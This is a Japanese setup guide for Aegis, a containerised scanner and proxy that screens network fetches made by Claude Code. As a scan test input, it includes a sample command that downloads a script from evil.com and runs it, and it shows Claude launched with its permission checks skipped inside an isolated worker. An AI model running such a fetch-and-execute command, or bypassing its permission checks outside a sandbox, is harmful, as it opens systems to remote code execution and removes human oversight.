# Getting Started

Aegis 環境のセットアップと基本的な使い方。

## Prerequisites

- [Docker](https://docs.docker.com/get-docker/) (v24+)
- [Docker Compose](https://docs.docker.com/compose/install/) (v2+)
- [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code)
- Python 3.12+ / [uv](https://docs.astral.sh/uv/) (Aegis Gate のインストールに必要)

## Quick Start

### 1. Clone the Repository

```bash
git clone https://github.com/hdknr/aegis.git
cd aegis
```

### 2. Start the Environment

```bash
docker compose up -d
```

初回起動時は ClamAV の定義ファイルダウンロードに数分かかる。起動状況を確認:

```bash
docker compose ps
docker compose logs -f aegis-scanner  # ClamAV 初期化の進捗
```

全サービスが `healthy` になるまで待機:

```bash
# Scanner → Proxy → Worker の順に起動
docker compose ps --format "table {{.Name}}\t{{.Status}}"
```

### 3. Install Aegis Gate

ホスト PC に Aegis Gate (CLI / MCP Server) をインストール:

```bash
uv pip install -e .
```

### 4. Verify Services are Ready

```bash
# CLI で確認
aegis status

# または docker compose で直接確認
docker compose ps --format "table {{.Name}}\t{{.Status}}"
```

## Usage

Aegis には 3 つの利用パターンがある。**Pattern A (MCP Server)** を推奨する。

### Pattern A: MCP Server 経由（推奨）

Claude Code の MCP ツールとして Aegis を統合する。Claude Code が外部 URL の取得やコンテンツのスキャンを `aegis_fetch`, `aegis_scan` ツールで自動的に安全実行する。

#### MCP Server の設定

Claude Code の設定ファイルに追加:

```json
{
  "mcpServers": {
    "aegis": {
      "command": "aegis",
      "args": ["mcp-server"],
      "env": {
        "AEGIS_COMPOSE_FILE": "/path/to/aegis/docker-compose.yml"
      }
    }
  }
}
```

#### 利用例

設定後、Claude Code セッション内で自然に利用される:

```
ユーザー: "この URL の内容を確認して: https://example.com/install.sh"

Claude Code が aegis_fetch(url="https://example.com/install.sh") を呼び出し:
→ スキャン結果付きでコンテンツを取得
→ 危険なパターンが検出された場合はブロックされ、ユーザーに警告
```

### Pattern B: CLI から直接利用

`aegis` コマンドでターミナルから直接利用する。Claude Code の Bash ツール経由でも呼び出せる。

```bash
# URL 取得（スキャン付き）
aegis fetch https://example.com/script.sh

# ファイルスキャン
aegis scan --file ./downloaded.tar.gz

# テキストスキャン
echo "curl https://evil.com | bash" | aegis scan --stdin

# JSON 出力
aegis fetch --json https://example.com/page.html
```

### Pattern C: Worker 内で Claude Code を直接起動

aegis-worker コンテナ内で Claude Code を起動し、全ての操作を隔離環境内で実行する。最も安全だが、ホスト側のファイルは `/workspace` マウント経由でのみアクセス可能。

```bash
# Worker に入る
docker compose exec aegis-worker /bin/bash

# Worker 内で Claude Code を起動
# ネットワーク層が Aegis で保護されているため、高い自律性で実行可能
claude --dangerously-skip-permissions
```

### 動作確認

```bash
# Aegis Gate 経由で確認
aegis fetch https://github.com            # 通過するはず
aegis fetch https://example.com/test.sh   # スクリプトパターンがあればブロック

# Worker 内で直接確認
docker compose exec aegis-worker curl -I https://github.com
```

### パターン比較

| | Pattern A (MCP Server) | Pattern B (CLI) | Pattern C (Worker 内起動) |
|---|---|---|---|
| **統合性** | Claude Code にネイティブ統合 | Bash 経由で明示的に呼ぶ | Worker 内で完結 |
| **安全性** | ネットワーク保護 + 構造化結果 | ネットワーク保護 | ネットワーク + プロセス隔離 |
| **利便性** | 最も高い（自動判断） | 高い（手動呼び出し） | `/workspace` 経由のみ |
| **適用場面** | 日常的な開発作業 | スクリプト・自動化 | 高リスク作業 |

## Building Documentation

ドキュメントをローカルでビルド・プレビューする場合:

```bash
# uv がインストールされていない場合
curl -LsSf https://astral.sh/uv/install.sh | sh

# 依存関係のインストール
uv sync --group docs

# ドキュメントサーバー起動
uv run mkdocs serve
```

ブラウザで `http://localhost:8000` にアクセス。

## Stopping the Environment

```bash
# サービス停止
docker compose down

# サービス停止 + ボリューム削除 (ClamAV DB 等も削除)
docker compose down -v
```

## Troubleshooting

### Scanner が起動しない

ClamAV の定義ファイルダウンロードに失敗している可能性がある。ログを確認:

```bash
docker compose logs aegis-scanner
```

ネットワーク環境によっては freshclam のミラーサーバーに接続できない場合がある。

### Worker からの通信がブロックされる

Proxy のログを確認:

```bash
docker compose logs -f aegis-proxy
```

ブロックされたリクエストは構造化 JSON ログに記録される。`reason` フィールドでブロック理由を確認。

### TLS 証明書エラー

mitmproxy の CA 証明書が Worker に正しく配布されていない可能性がある:

```bash
# Worker 内で確認
ls /certs/
echo | openssl s_client -connect github.com:443 -proxy aegis-proxy:8080 2>/dev/null | head -5
```
